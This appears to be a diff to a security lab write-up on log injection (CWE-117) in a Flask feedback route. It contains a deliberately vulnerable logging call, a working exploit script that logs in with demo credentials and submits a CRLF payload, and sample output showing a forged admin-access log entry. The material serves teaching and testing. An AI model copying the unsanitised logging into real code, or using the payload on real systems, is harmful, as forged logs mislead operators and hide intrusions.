@@ -74,29 +74,21 @@ The insecure section is the log call, which concatenates the user‑supplied
 `comment` directly into the log message with no sanitisation:
 
 ```python
-@app.route('/feedback', methods=['GET', 'POST'])
+@app.route("/feedback", methods=["GET", "POST"])
 def feedback():
-    if 'user' not in session:
-        return redirect(url_for('login'))
+    if "username" not in session:
+        return redirect(url_for("login"))
 
-    if request.method == 'POST':
-        comment = request.form.get('comment')
-        user = session.get('user', 'anonymous')
+    if request.method == "POST":
+        comment = request.form.get("comment")
+        user = session.get("username", "anonymous")
 
-        # ---------------------------------------------------------------
-        # VULNERABILITY: Log Injection
-        # (CWE-117: Improper Output Neutralization for Logs)
-        #
-        # The user-supplied 'comment' is written STRAIGHT into the log
-        # message with no sanitisation. Python's logging module writes
-        # whatever bytes it is given to app_vulnerable.log verbatim,
-        # including any control characters in the user's input.
-        #
-        # RISK: If 'comment' contains CRLF characters (\r\n), the single
-        # intended entry is split into MULTIPLE lines on disk. An attacker
-        # can therefore FORGE fake log records that look identical to
-        # genuine ones (log forging).
-        # ---------------------------------------------------------------
+        # ========================================================
+        # LOG INJECTION VULNERABILITY (CWE-117)
+        # Direct user input concatenation in logs without sanitization.
+        # RISK: Attacker can inject CRLF characters (\r\n) to forge fake log entries.
+        # ========================================================
+
         logging.info(f"New feedback received from user '{user}': {comment}")
 ```
 
@@ -125,8 +117,9 @@ Nice work team\r\n2026-09-24 09:15:00,000 - WARNING - SECURITY: Admin access gra
 ```
 
 Because the `/feedback` route requires an authenticated session, the exploit
-script (`exploits/log_injection_exploit.py`) first requests `/login` to establish
-a session, then submits the malicious comment:
+script (`exploits/log_injection_exploit.py`) first logs in — the integrated
+application requires a genuine `POST /login` with the demo credentials
+`student` / `password123` — and then submits the malicious comment:
 
 ```python
 import urllib.request, urllib.parse, http.cookiejar
@@ -140,7 +133,11 @@ PAYLOAD = (
 
 cj = http.cookiejar.CookieJar()
 opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
-opener.open(BASE + "/login")
+
+# The integrated app requires a real POST login before /feedback is reachable.
+login = urllib.parse.urlencode({"username": "student", "password": "password123"}).encode()
+opener.open(BASE + "/login", data=login)
+
 opener.open(BASE + "/feedback",
             data=urllib.parse.urlencode({"comment": PAYLOAD}).encode())
 ```
@@ -167,14 +164,14 @@ opener.open(BASE + "/feedback",
 Submitting a **normal** comment produces a single, correct entry:
 
 ```
-2026-09-24 00:03:17,150 - INFO - New feedback received from user 'victim_user': Great app, thanks!
+2026-09-24 00:03:17,150 - INFO - New feedback received from user 'student': Great app, thanks!
 ```
 
 Submitting the **CRLF payload** causes the one log call to write two lines, the
 second being the forged record:
 
 ```
-2026-09-24 00:03:17,151 - INFO - New feedback received from user 'victim_user': Nice work team
+2026-09-24 00:03:17,151 - INFO - New feedback received from user 'student': Nice work team
 2026-09-24 09:15:00,000 - WARNING - SECURITY: Admin access granted to user 'attacker' from 127.0.0.1
 ```
 
